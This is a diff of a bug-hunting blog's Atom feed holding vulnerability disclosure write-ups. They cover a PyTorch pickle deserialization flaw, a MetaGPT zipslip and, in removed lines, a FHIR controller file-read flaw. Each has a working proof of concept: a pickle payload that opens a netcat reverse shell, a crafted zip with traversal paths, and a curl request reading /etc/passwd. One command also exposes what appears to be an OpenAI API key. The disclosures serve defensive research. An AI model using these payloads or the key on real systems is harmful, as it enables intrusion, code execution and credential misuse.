@@ -1,4 +1,305 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-06T14:17:40+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-25T08:51:16+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Command injection via unsafe pickle.loads in torch.utils.model_dump</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-94: Code Injection</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>2.3.1</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>In pytorch module <a href="https://github.com/pytorch/pytorch/blob/main/torch/utils/model_dump/__init__.py"><code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code></a>, the method <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L189"><code class="language-plaintext highlighter-rouge">get_model_info</code></a> is responsible for extracting a model data in zip file. However, during the extraction, if a pickle file endswith <code class="language-plaintext highlighter-rouge">debug_pkl</code>, this file will be parsed by <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">pickle.loads</code> function</a>. In this case, if a <a href="https://book.hacktricks.xyz/pentesting-web/deserialization#pickle">malicous pickle file is parsed</a>, we can achive command injection in victim’s mechine.</p>
+
+<p>The vulnerable function: <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">get_model_info</code></a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_model_info(
+        path_or_file,
+        title=None,
+        extra_file_size_limit=DEFAULT_EXTRA_FILE_SIZE_LIMIT):
+    """Get JSON-friendly information about a model.
+
+    The result is suitable for being saved as model_info.json,
+    or passed to burn_in_info.
+    """
+    ...
+    with zipfile.ZipFile(path_or_file) as zf:
+        
+        code_files = {}
+        for zi in zf.infolist():
+            if not zi.filename.endswith(".py"):
+                continue
+            with zf.open(zi) as handle:
+                raw_code = handle.read()
+            with zf.open(zi.filename + ".debug_pkl") as handle:
+                raw_debug = handle.read()
+
+            # Parse debug info and add begin/end markers if not present
+            # to ensure that we cover the entire source code.
+            # vulnerable sink!!!!!!!!!!
+            debug_info_t = pickle.loads(raw_debug)
+            
+    ...
+    return {"model": dict(
+        title=title,
+        file_size=file_size,
+        version=version,
+        zip_files=zip_files,
+        interned_strings=list(interned_strings),
+        code_files=code_files,
+        model_data=model_data,
+        constants=constants,
+        extra_files_jsons=extra_files_jsons,
+        extra_pickles=extra_pickles,
+    )}
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>Firstly, let’s create a malicous model, and compress it with zip format. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L230"><code class="language-plaintext highlighter-rouge">get_model_info#L230</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">version</code> file. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L238"><code class="language-plaintext highlighter-rouge">get_model_info#L238</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code> files. In line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L255"><code class="language-plaintext highlighter-rouge">get_model_info#L255</code></a> and line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L259"><code class="language-plaintext highlighter-rouge">get_model_info#L259</code></a>, we know that the model must contain a python file and a <code class="language-plaintext highlighter-rouge">debug_pkl</code> file. So, let’s create those files:</p>
+
+<h3 id="version-1"><code class="language-plaintext highlighter-rouge">version</code></h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.1.0
+</code></pre></div></div>
+
+<h3 id="datapkl-and-constantspkl"><code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code></h3>
+
+<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">data.pkl</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+student_names = [1]
+with open('data.pkl', 'wb') as f:
+    pickle.dump(student_names, f)
+</code></pre></div></div>
+
+<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">constants.pkl</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+student_names = ["df"]
+with open('constants.pkl', 'wb') as f:
+    pickle.dump(student_names, f)
+</code></pre></div></div>
+
+<h3 id="payloadpy"><code class="language-plaintext highlighter-rouge">payload.py</code></h3>
+
+<p>Just create a empty file named <code class="language-plaintext highlighter-rouge">payload.py</code></p>
+
+<h3 id="payloadpydebug_pkl"><code class="language-plaintext highlighter-rouge">payload.py.debug_pkl</code></h3>
+
+<p>Use following snippets to create a malicous pickle payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
+        return os.system, (cmd,)
+
+with open('payload.py.debug_pkl', 'wb') as f:
+    pickle.dump(RCE(), f)
+</code></pre></div></div>
+
+<h3 id="malicious-model-zip-file"><code class="language-plaintext highlighter-rouge">malicious model zip file</code></h3>
+
+<p>Copy all the files to a folder and create a model zipfile:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la torch-model-dump
+-rw-r--r-- 1 kali kali   20 Jun 24 17:45 constants.pkl
+-rw-r--r-- 1 kali kali   17 Jun 24 17:45 data.pkl
+-rw-r--r-- 1 kali kali    0 Jun 24 17:45 payload.py
+-rw-r--r-- 1 kali kali  121 Jun 24 17:45 payload.py.debug_pkl
+-rw-r--r-- 1 kali kali    6 Jun 24 17:39 version
+
+&gt; zip -r torch-model-dump.zip torch-model-dump
+</code></pre></div></div>
+
+<p>The <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/torch-model-dump.zip"><code class="language-plaintext highlighter-rouge">torch-model-dump.zip</code></a> can be download from github.</p>
+
+<h2 id="start-attack">Start attack</h2>
+
+<p>Install latest pytorch:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install torch
+</code></pre></div></div>
+
+<p>Use following command to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m torch.utils.model_dump --style=json ./torch-model-dump.zip
+</code></pre></div></div>
+
+<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
+prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
+</code></pre></div></div>
+<h2 id="colab">Colab</h2>
+
+<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing">https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing</a></p>
+
+<p><img src="/assets/images/bughunter/torch-pickle.png" alt="image" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. If victims parse a malicious model file using <code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code>, command injection can be achieved.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264">get_model_info#L264</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt</title><link href="http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html" rel="alternate" type="text/html" title="Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Zipslip when parsing invoice zip file via InvoiceOCRAssistant</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-23: Relative Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>0.8.1</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>In <a href="https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html"><code class="language-plaintext highlighter-rouge">receipt_assistant</code></a>, Metagpt supports OCR recognition of invoice files in pdf, png, jpg, and zip formats. And the class <a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L31C7-L31C17"><code class="language-plaintext highlighter-rouge">InvoiceOCR</code></a> is responsible for recognizing the invoice files. When the files is compressed with zip format, <a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L63"><code class="language-plaintext highlighter-rouge">InvoiceOCR._unzip</code></a> is used to extract the files in zip file. However, the file name in zip file is not sanitized and appended to dest path directly, could cause zipslip attacks. It’s possible to overwrite files in victims’ mechine, causing code execution attacks.</p>
+
+<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L78">InvoiceOCR._unzip#L78</a> function:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
+async def _unzip(file_path: Path) -&gt; Path:
+    """Unzip a file and return the path to the unzipped directory.
+
+    Args:
+        file_path: The path to the zip file.
+
+    Returns:
+        The path to the unzipped directory.
+    """
+    file_directory = file_path.parent / "unzip_invoices" / datetime.now().strftime("%Y%m%d%H%M%S")
+    with zipfile.ZipFile(file_path, "r") as zip_ref:
+        for zip_info in zip_ref.infolist():
+            # Use CP437 to encode the file name, and then use GBK decoding to prevent Chinese garbled code
+            relative_name = Path(zip_info.filename.encode("cp437").decode("gbk"))
+            if relative_name.suffix:
+                # unsafe path appending
+                full_filename = file_directory / relative_name
+                await File.write(full_filename.parent, relative_name.name, zip_ref.read(zip_info.filename))
+
+    logger.info(f"unzip_path: {file_directory}")
+    return file_directory
+</code></pre></div></div>
+
+<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39"><code class="language-plaintext highlighter-rouge">File.write#L39</code></a> function is reponsible for writing the file content in zip file to target path. In Line 39, <code class="language-plaintext highlighter-rouge">full_path = root_path / filename</code>, the <code class="language-plaintext highlighter-rouge">filename</code> is not santized, filename such as <code class="language-plaintext highlighter-rouge">../../../../../../../../test.txt</code> in zip file will be appended to <code class="language-plaintext highlighter-rouge">root_path</code>, causing path traversal and file overwrite.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def write(cls, root_path: Path, filename: str, content: bytes) -&gt; Path:
+    """Write the file content to the local specified path.
+
+    Args:
+        root_path: The root path of file, such as "/data".
+        filename: The name of file, such as "test.txt".
+        content: The binary content of file.
+
+    Returns:
+        The full filename of file, such as "/data/test.txt".
+
+    Raises:
+        Exception: If an unexpected error occurs during the file writing process.
+    """
+    root_path.mkdir(parents=True, exist_ok=True)
+    full_path = root_path / filename
+    async with aiofiles.open(full_path, mode="wb") as writer:
+        await writer.write(content)
+        logger.debug(f"Successfully write file: {full_path}")
+        return full_path
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>Firstly, let’s create a zip file containing relative file name, and save as <code class="language-plaintext highlighter-rouge">auth.zip</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip auth.zip ../../../../../../../home/kali/test.py
+</code></pre></div></div>
+
+<p>Then, install metagpt and it’s ocr extras:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install --upgrade metagpt
+pip install --upgrade 'metagpt[ocr]'
+</code></pre></div></div>
+
+<p>After installed, we need to init metagpt with our openai key according to <a href="https://github.com/geekan/MetaGPT?tab=readme-ov-file#configuration">official documentation</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># create 
+&gt; metagpt --init-config
+
+# fill your openai key, this key is for testing
+&gt; sed -i 's/YOUR_API_KEY/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/g' /root/.metagpt/config2.yaml
+</code></pre></div></div>
+
+<p>Before attacks, let’s check the <code class="language-plaintext highlighter-rouge">/home/kali/test.py</code> is empty path</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /home/kali/test.py
+ls: cannot access '/home/kali/test.py': No such file or directory
+</code></pre></div></div>
+
+<h3 id="start-attack">Start attack</h3>
+
+<p>Run following snippets from <a href="https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html#example-1">offical tutorial</a> to parse and recognize our <code class="language-plaintext highlighter-rouge">auth.zip</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from metagpt.roles.invoice_ocr_assistant import InvoiceOCRAssistant, InvoicePath
+from metagpt.schema import Message
+
+role = InvoiceOCRAssistant()
+await role.run(Message(content="Invoicing date", instruct_content=InvoicePath(file_path="auth.zip")))
+</code></pre></div></div>
+
+<p>Now let’s check the file is overwritten successfully:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /home/kali/test.py
+-rw-r--r-- 1 root root 12 Jun 24 14:50 /home/kali/test.py
+</code></pre></div></div>
+
+<h2 id="colab">Colab</h2>
+
+<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing">https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing</a></p>
+
+<p><img src="https://live.staticflickr.com/65535/53811891297_68e84388c8_h.jpg" alt="poc" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. If victims parse and recognize an malicious zip file, zipslip can be achieved to overwrite files in victims mechine, causing potential code execution attack.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L79">_unzip#L79</a></p>
+
+<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39">write#L39</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.</p>
 
 <h3 id="details">Details</h3>
@@ -108,7 +409,7 @@
 </code></pre></div></div>
 <ol>
   <li>
-    <p>Open chrome devtools, you can see CSP is blocking the XSSfrom executing.</p>
+    <p>Open chrome devtools, you can see CSP is blocking the XSS from executing.</p>
 
     <p><img width="762" alt="outline-xss" src="https://github.com/outline/outline/assets/33363160/360801a9-0964-46f2-9244-5b2d4466da72" />
  <img width="647" alt="outline-xss2" src="https://github.com/outline/outline/assets/33363160/519f4340-187a-401f-a2be-356b8d6e1513" /></p>
@@ -1010,253 +1311,4 @@ async def upload_file(
 
 <p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>
 
-<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller($101)</title><link href="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller($101)" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Local File Inclusion in FHIR Pipelines Controller</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>A local file inclusion is present in the FHIR Pipelines Controller when fetching error log file under the <code class="language-plaintext highlighter-rouge">/download?path=</code> route.</p>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">route</a> <code class="language-plaintext highlighter-rouge">/download</code> is used for fetching error log if <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">pipeline run failed</a>. However, the <code class="language-plaintext highlighter-rouge">path</code> parameter is not limited to <code class="language-plaintext highlighter-rouge">dwhRoot</code> folder causing any file on the filesystem can be read.</p>
-
-<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">spring boot rest controller</a> to download the log file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@GetMapping(
-      value = "/download",
-      produces = {MediaType.TEXT_PLAIN_VALUE})
-public ResponseEntity&lt;InputStreamResource&gt; download(@RequestParam(name = "path") String path)
-      throws IOException {
-    ResourceId resourceId = FileSystems.matchNewResource(path, false);
-    ReadableByteChannel channel = FileSystems.open(resourceId);
-    InputStream stream = Channels.newInputStream(channel);
-    InputStreamResource inputStreamResource = new InputStreamResource(stream);
-    MultiValueMap&lt;String, String&gt; headers = new HttpHeaders();
-    headers.put("Content-type", Arrays.asList(MediaType.TEXT_PLAIN_VALUE));
-    return new ResponseEntity&lt;&gt;(inputStreamResource, headers, HttpStatus.OK);
-}
-</code></pre></div></div>
-
-<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">frontend view</a> to fetch log file:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div th:unless="${#strings.isEmpty(lastRunDetails.logFilePath)}"&gt;
-    Last run failed! Please find error logs here
-    &lt;button type="submit"
-            class="button btn btn-primary" th:onclick="openLogs([[${lastRunDetails.logFilePath}]])"&gt;
-        View Raw Logs
-    &lt;/button&gt;
-&lt;/div&gt;
-</code></pre></div></div>
-<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L18">javascript function openLogs</a> to fetch the file:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function openLogs(logPath) {
-    const url = "/download?path="+logPath;
-    // Encode the special characters in the url
-    const encodedURL = encodeURI(url);
-    window.open(encodedURL, '_blank').focus();
-}
-</code></pre></div></div>
-
-<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/PipelineManager.java#L757">log file path</a> <code class="language-plaintext highlighter-rouge">logFilePath</code> is supposed to <code class="language-plaintext highlighter-rouge">dwhRoot + ERROR_FILE_NAME</code>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String fileSeparator = DwhFiles.getFileSeparatorForDwhFiles(dwhRoot);
-dwhRoot = dwhRoot.endsWith(fileSeparator) ? dwhRoot : dwhRoot + fileSeparator;
-ResourceId errorResource = FileSystems.matchNewResource(dwhRoot + ERROR_FILE_NAME, false);
-if (dwhFilesManager.doesFileExist(errorResource)) {
-    dwhRunDetails.setLogFilePath(dwhRoot + ERROR_FILE_NAME);
-}
-</code></pre></div></div>
-
-<h3 id="steps-to-reproduce">Steps to reproduce</h3>
-
-<p>Following the official <a href="https://github.com/google/fhir-data-pipes/wiki/Try-out-the-FHIR-Pipelines-Controller#set-up-the-test-server">tutorial</a> to set up the HAPI FHIR server and the FHIR Pipelines Controller service:</p>
-
-<ol>
-  <li>
-    <p>Clone the fhir-data-pipes repository.</p>
-  </li>
-  <li>
-    <p>Set up a local HAPI FHIR server using docker:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> docker network create cloudbuild
- docker-compose  -f ./docker/hapi-compose.yml up  --force-recreate -d
-</code></pre></div>    </div>
-    <p>The base URL for this server is http://localhost:8098/fhir.</p>
-  </li>
-  <li>
-    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/application.yaml">pipelines/controller/config/application.yml</a> in a text editor. Change <code class="language-plaintext highlighter-rouge">fhirServerUrl</code> to be:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> fhirServerUrl: "http://localhost:8091/fhir"
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/hapi-postgres-config.json">pipelines/controller/config/hapi-postgres-config.json</a>. Change <code class="language-plaintext highlighter-rouge">databaseHostName</code> to be:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "databaseHostName" : "localhost"
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>Build the fhir-data-pipes service. In fhir-data-pipes root directory, run following:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd fhir-data-pipes-master
- mvn install -Dlicense.skip=true
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>After built successfully, <code class="language-plaintext highlighter-rouge">pipelines/controller/target/controller-bundled.jar</code> is generated. Run the server in <code class="language-plaintext highlighter-rouge">pipelines/controller/</code> directory:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd pipelines/controller/
- java -jar target/controller-bundled.jar
-</code></pre></div>    </div>
-    <p>After service up, the FHIR Pipelines Controller will listen on <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code> in browser, We can see FHIR Pipelines Control Panel. Send following request to <code class="language-plaintext highlighter-rouge">/download</code> route:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl http://10.15.0.5:8080/download?path=/etc/passwd
-</code></pre></div>    </div>
-
-    <p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
- daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
- bin:x:2:2:bin:/bin:/usr/sbin/nologin
- sys:x:3:3:sys:/dev:/usr/sbin/nologin
- sync:x:4:65534:sync:/bin:/bin/sync
- games:x:5:60:games:/usr/games:/usr/sbin/nologin
- man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
- lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
- mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
- news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
- uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
- proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
- www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
- backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
- list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
- irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
- gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
- nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
- _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h2 id="impact">Impact</h2>
-
-<p>Any file on the backend filesystem can be read by an attacker with access to the FHIR Pipelines Controller service.</p>
-
-<h2 id="occurrences">Occurrences</h2>
-
